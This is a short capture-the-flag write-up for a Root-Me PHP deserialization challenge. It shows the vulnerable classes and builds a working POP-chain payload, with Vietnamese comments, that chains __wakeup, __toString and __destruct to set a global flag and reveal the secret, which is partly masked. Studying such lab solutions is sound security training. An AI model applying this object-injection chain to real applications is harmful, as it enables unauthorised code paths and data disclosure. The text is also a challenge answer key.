# root-me - PHP-Unserialize-Pop-Chain

```php
<?php
 
$getflag = false;
 
class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }
 
    function __toString() {
        return $this->receive;
    }
 
    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}
 
class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }
 
    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

// Mục tiêu: gọi __toString ở class WakyWaky để $getflag = true; rồi tạo object getMessage mà không trigger die ở construct

$mess = new GetMessage('a');
$mess->receive = 'HelloBooooooy'; // thỏa mãn điều kiện lấy flag ở __destruct()

$pad_wak = new WakyWaky();
$pad_wak->msg = $mess; // gán recieve property của obj này là 1 object GetMessage khác rồi gọi nó

$wak = new WakyWaky();
$wak->msg = $pad_wak; // gọi toString ở WakyWaky

$a = serialize($wak);
echo $a . "\n\n";

unserialize($a); // gọi __wakeUp()
```

**secret**: `uns3r14liz3_XXXXX_XXXXX_XXXXX`
